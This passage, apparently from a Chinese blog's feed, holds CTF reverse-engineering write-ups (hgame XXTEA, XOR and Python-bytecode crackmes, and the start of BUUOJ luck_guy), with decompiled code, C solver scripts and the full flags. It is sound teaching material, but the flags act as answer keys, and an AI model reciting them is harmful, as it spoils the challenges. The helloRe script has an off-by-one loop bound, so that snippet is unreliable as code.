[rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  v7 = <span class="number">2</span>;</span><br><span class="line">  v8 = <span class="number">3</span>;</span><br><span class="line">  v9 = <span class="number">4</span>;</span><br><span class="line">  sub_11AA(a1, a2, a3);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">&quot;Please input: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%35s&quot;</span>, v10);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(v10) != <span class="number">35</span> )       <span class="comment">//验证长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong length!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3[v4] = v10[v4];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != <span class="number">35</span> );</span><br><span class="line">  sub_1447(v3, <span class="number">35L</span>L, &amp;v6, v10);                <span class="comment">//xxtea加密</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1550(v3, <span class="number">35L</span>L) )      <span class="comment">//再次验证</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    :)  Flag is your input.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    :(  Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">btea</span><span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>])</span>       </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line"><span class="keyword">int</span> p, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 加密过程 */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">    sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p+<span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 解密过程 */</span></span><br><span class="line">        n = -n;</span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">sum = q*DELTA ;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) </span><br><span class="line">&#123;</span><br><span class="line">z = v[p<span class="number">-1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>]; </span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> check[<span class="number">35</span>]=&#123;<span class="number">0x0E74EB323</span>,<span class="number">0x0B7A72836</span>,<span class="number">0x59CA6FE2</span>,<span class="number">0x967CC5C1</span>,<span class="number">0x0E7802674</span>,<span class="number">0x3D2D54E6</span>,</span><br><span class="line"><span class="number">0x8A9D0356</span>,<span class="number">0x99DCC39C</span>,<span class="number">0x7026D8ED</span>,<span class="number">0x6A33FDAD</span>,<span class="number">0x0F496550A</span>,<span class="number">0x5C9C6F9E</span>,<span class="number">0x1BE5D04C</span>,<span class="number">0x6723AE17</span>,</span><br><span class="line"><span class="number">0x5270A5C2</span>,<span class="number">0x0AC42130A</span>,<span class="number">0x84BE67B2</span>,<span class="number">0x705CC779</span>,<span class="number">0x5C513D98</span>,<span class="number">0x0FB36DA2D</span>,<span class="number">0x22179645</span>,<span class="number">0x5CE3529D</span>,</span><br><span class="line"><span class="number">0x0D189E1FB</span>,<span class="number">0x0E85BD489</span>,<span class="number">0x73C8D11F</span>,<span class="number">0x54B5C196</span>,<span class="number">0x0B67CB490</span>,<span class="number">0x2117E4CA</span>,<span class="number">0x9DE3F994</span>,<span class="number">0x2F5AA1AA</span>,</span><br><span class="line"><span class="number">0x0A7E801FD</span>,<span class="number">0x0C30D6EAB</span>,<span class="number">0x1BADDC9C</span>,<span class="number">0x3453B04A</span>,<span class="number">0x92A406F9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">35</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,check[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上述算法描述中，v表示为运算的长整型数据的首地址，k为长整型的密钥的首地址，n表示要要运算的组元个数，正表示加密，负表示解密。N是以32bit为基本单位的组元个数。</span></span><br></pre></td></tr></table></figure><blockquote><p>hgame{l00ks_1ike_y0u_f0Und_th3_t34}</p></blockquote><h1 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h1><p><a href="https://pan.baidu.com/s/1t1QacPyctI_WSWYYMA5_FQ">题目附件</a>提取码：ciyc<br>这道题就是异或与比较<br>直接上脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> memory[<span class="number">22</span>];</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0x0FF</span>;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">22</span>]=&#123;<span class="number">0x97</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x91</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0x91</span>, <span class="number">0x9D</span>, <span class="number">0x9B</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0x81</span>, <span class="number">0x97</span>, <span class="number">0xAE</span>, <span class="number">0x80</span>, <span class="number">0x83</span>, <span class="number">0x8F</span>, <span class="number">0x94</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0x97</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">memory[i]=b[i]^a;</span><br><span class="line">a--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, memory);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;hgame&#123;hello_re_player&#125;</span><br></pre></td></tr></table></figure><h1 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h1><p><a href="https://pan.baidu.com/s/11-_mbvb6tZezucy2DbU7CQ">题目附件</a>提取码：a5mm<br>python字节码，参考文档还原，好像有软件可以直接还原。<br><a href="https://docs.python.org/zh-cn/3.7/library/dis.html">文档链接</a><br>大致意思为：输入flag，去flag第六位至倒数第一位，flag[2i]与flag[2i+1]交换，<br>flag[i]^=i,最后输出的flag为30466633346f59213b4139794520572b45514d61583151576638643a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_GLOBAL              0 (input)</span><br><span class="line">              2 LOAD_CONST               1 (&#39;give me your flag:\n&#39;)</span><br><span class="line">              4 CALL_FUNCTION            1</span><br><span class="line">              6 STORE_FAST               0 (raw_flag)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_GLOBAL              1 (list)</span><br><span class="line">             10 LOAD_FAST                0 (raw_flag)</span><br><span class="line">             12 LOAD_CONST               2 (6)</span><br><span class="line">             14 LOAD_CONST               3 (-1)</span><br><span class="line">             16 BUILD_SLICE              2                  </span><br><span class="line">             18 BINARY_SUBSCR</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 STORE_FAST               1 (cipher)              cipher&#x3D;flag[6::-1]</span><br><span class="line"></span><br><span class="line">  6          24 LOAD_GLOBAL              2 (len)</span><br><span class="line">             26 LOAD_FAST                1 (cipher)</span><br><span class="line">             28 CALL_FUNCTION            1</span><br><span class="line">             30 STORE_FAST               2 (length)           length&#x3D;len(cipher)</span><br><span class="line"></span><br><span class="line">  8          32 LOAD_GLOBAL              3 (range)</span><br><span class="line">             34 LOAD_FAST                2 (length)</span><br><span class="line">             36 LOAD_CONST               4 (2)</span><br><span class="line">             38 BINARY_FLOOR_DIVIDE                              range(length&#x2F;2)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 GET_ITER</span><br><span class="line">        &gt;&gt;   44 FOR_ITER                54 (to 100)</span><br><span class="line">             46 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  9          48 LOAD_FAST                1 (cipher)</span><br><span class="line">             50 LOAD_CONST               4 (2)</span><br><span class="line">             52 LOAD_FAST                3 (i)</span><br><span class="line">             54 BINARY_MULTIPLY                                  2i</span><br><span class="line">             56 LOAD_CONST               5 (1)</span><br><span class="line">             58 BINARY_ADD                                       2i+1</span><br><span class="line">             60 BINARY_SUBSCR                                    cipher[2i+1]</span><br><span class="line">             62 LOAD_FAST                1 (cipher)</span><br><span class="line">             64 LOAD_CONST               4 (2)</span><br><span class="line">             66 LOAD_FAST                3 (i)</span><br><span class="line">             68 BINARY_MULTIPLY</span><br><span class="line">             70 BINARY_SUBSCR                                    cipher[2i]</span><br><span class="line">             72 ROT_TWO                                          cipher[2i]与cipher[2i+1]交换</span><br><span class="line">             74 LOAD_FAST                1 (cipher)</span><br><span class="line">             76 LOAD_CONST               4 (2)</span><br><span class="line">             78 LOAD_FAST                3 (i)</span><br><span class="line">             80 BINARY_MULTIPLY</span><br><span class="line">             82 STORE_SUBSCR</span><br><span class="line">             84 LOAD_FAST                1 (cipher)</span><br><span class="line">             86 LOAD_CONST               4 (2)</span><br><span class="line">             88 LOAD_FAST                3 (i)</span><br><span class="line">             90 BINARY_MULTIPLY</span><br><span class="line">             92 LOAD_CONST               5 (1)</span><br><span class="line">             94 BINARY_ADD</span><br><span class="line">             96 STORE_SUBSCR                                     新的cipher</span><br><span class="line">             98 JUMP_ABSOLUTE           44</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;  100 BUILD_LIST               0</span><br><span class="line">            102 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 13         104 LOAD_GLOBAL              3 (range)</span><br><span class="line">            106 LOAD_FAST                2 (length)</span><br><span class="line">            108 CALL_FUNCTION            1</span><br><span class="line">            110 GET_ITER                                         range(length)</span><br><span class="line">        &gt;&gt;  112 FOR_ITER                26 (to 140)</span><br><span class="line">            114 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line"> 14         116 LOAD_FAST                4 (res)</span><br><span class="line">            118 LOAD_METHOD              4 (append)</span><br><span class="line">            120 LOAD_GLOBAL              5 (ord)</span><br><span class="line">            122 LOAD_FAST                1 (cipher)</span><br><span class="line">            124 LOAD_FAST                3 (i)</span><br><span class="line">            126 BINARY_SUBSCR</span><br><span class="line">            128 CALL_FUNCTION            1</span><br><span class="line">            130 LOAD_FAST                3 (i)</span><br><span class="line">            132 BINARY_XOR                                       res&#x3D;ord(cipher[i])^i</span><br><span class="line">            134 CALL_METHOD              1</span><br><span class="line">            136 POP_TOP</span><br><span class="line">            138 JUMP_ABSOLUTE          112</span><br><span class="line"></span><br><span class="line"> 15     &gt;&gt;  140 LOAD_GLOBAL              6 (bytes)</span><br><span class="line">            142 LOAD_FAST                4 (res)</span><br><span class="line">            144 CALL_FUNCTION            1</span><br><span class="line">            146 LOAD_METHOD              7 (hex)</span><br><span class="line">            148 CALL_METHOD              0</span><br><span class="line">            150 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 16         152 LOAD_GLOBAL              8 (print)</span><br><span class="line">            154 LOAD_CONST               6 (&#39;your flag: &#39;)  </span><br><span class="line">            156 LOAD_FAST                4 (res)                 输出res(hex)</span><br><span class="line">            158 BINARY_ADD</span><br><span class="line">            160 CALL_FUNCTION            1</span><br><span class="line">            162 POP_TOP</span><br><span class="line">            164 LOAD_CONST               0 (None)</span><br><span class="line">            166 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">28</span>]=&#123;<span class="number">0x30</span>,<span class="number">0x46</span>,<span class="number">0x66</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x6f</span>,<span class="number">0x59</span>,<span class="number">0x21</span>,<span class="number">0x3b</span>,<span class="number">0x41</span>,<span class="number">0x39</span>,<span class="number">0x79</span>,<span class="number">0x45</span>,<span class="number">0x20</span>,<span class="number">0x57</span>,<span class="number">0x2b</span>,<span class="number">0x45</span>,<span class="number">0x51</span>,<span class="number">0x4d</span>,<span class="number">0x61</span>,<span class="number">0x58</span>,<span class="number">0x31</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0x66</span>,<span class="number">0x38</span>,<span class="number">0x64</span>,<span class="number">0x3a</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,a;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">14</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a=flag[<span class="number">2</span>*i];</span><br><span class="line">flag[<span class="number">2</span>*i]=flag[<span class="number">2</span>*i+<span class="number">1</span>];</span><br><span class="line">flag[<span class="number">2</span>*i+<span class="number">1</span>]=a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]luck_guy">题目链接</a><br>查看文件信息，是64位文件，拖进ida里，可以发现get_flag为flag的变换函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745L</span>L;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">1</span>;</span><br><span class="line">          *(&amp;f2 + j) = v1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是先运行case 4，然后case 5，最后case 1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">8</span>]=&#123;<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x67</span>,<span class="number">0x60</span>,<span class="number">0x6f</span>,<span class="number">0x66</span>,<span class="number">0x7f</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,v1;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( i % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            a[i] 